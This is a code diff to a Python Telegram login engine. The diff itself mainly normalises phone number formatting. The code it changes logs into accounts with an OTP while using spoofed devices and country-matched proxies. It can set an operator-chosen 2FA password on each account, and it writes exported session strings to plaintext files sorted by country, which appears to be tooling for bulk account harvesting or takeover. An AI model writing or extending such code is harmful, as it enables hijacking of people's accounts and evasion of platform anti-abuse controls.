@@ -12,9 +12,10 @@ class TelegramEngine:
             os.makedirs(self.storage_dir)
 
     async def send_otp(self, phone_number: str):
+        formatted_phone = self.config.format_phone_number(phone_number)
         device = self.config.get_random_device()
-        proxy = self.config.get_country_proxy(phone_number)
-        session_name = f"temp_{phone_number.replace('+', '')}"
+        proxy = self.config.get_country_proxy(formatted_phone)
+        session_name = f"temp_{formatted_phone.replace('+', '')}"
         
         client = Client(
             name=session_name,
@@ -29,23 +30,24 @@ class TelegramEngine:
         )
         
         await client.connect()
-        sent_code = await client.send_code(phone_number)
+        sent_code = await client.send_code(formatted_phone)
         
         return {
             "client": client,
             "phone_hash": sent_code.phone_code_hash,
-            "session_name": session_name
+            "session_name": session_name,
+            "formatted_phone": formatted_phone
         }
 
     async def complete_login(self, client: Client, phone_number: str, phone_hash: str, otp_code: str):
+        formatted_phone = self.config.format_phone_number(phone_number)
         try:
-            await client.sign_in(phone_number, phone_hash, otp_code)
+            await client.sign_in(formatted_phone, phone_hash, otp_code)
         except SessionPasswordNeeded:
             return {"status": "error", "message": "Account already has 2FA enabled!"}
         except PhoneCodeInvalid:
             return {"status": "error", "message": "Invalid OTP Code!"}
 
-        # 2FA Management Check
         applied_2fa = "Disabled"
         if self.config.use_2fa:
             applied_2fa = self.config.custom_2fa_password
@@ -54,24 +56,21 @@ class TelegramEngine:
             except Exception as e:
                 print(f"2FA Setup Note: {e}")
 
-        # Local DB Saving with Country Folder Separation
-        country_code = self.config.get_country_info(phone_number) or "UNKNOWN"
+        country_code = self.config.get_country_info(formatted_phone) or "UNKNOWN"
         country_dir = os.path.join(self.storage_dir, country_code)
         if not os.path.exists(country_dir):
             os.makedirs(country_dir)
 
-        clean_phone = phone_number.replace("+", "").strip()
+        clean_phone = formatted_phone.replace("+", "").strip()
         save_path = os.path.join(country_dir, f"{clean_phone}.session")
         
         session_string = await client.export_session_string()
         await client.disconnect()
 
-        # Metadata save
         info_path = os.path.join(country_dir, f"{clean_phone}_info.txt")
         with open(info_path, "w", encoding="utf-8") as f:
-            f.write(f"Phone: {phone_number}\nCountry: {country_code}\n2FA: {applied_2fa}\nSession String: {session_string}\n")
+            f.write(f"Phone: {formatted_phone}\nCountry: {country_code}\n2FA: {applied_2fa}\nSession String: {session_string}\n")
 
-        # Save Persistent File
         persistent_client = Client(
             name=save_path.replace(".session", ""),
             api_id=self.config.api_id,
@@ -81,4 +80,4 @@ class TelegramEngine:
         await persistent_client.connect()
         await persistent_client.disconnect()
 
-        return {"status": "success", "country": country_code}
+        return {"status": "success", "country": country_code, "formatted_phone": formatted_phone}
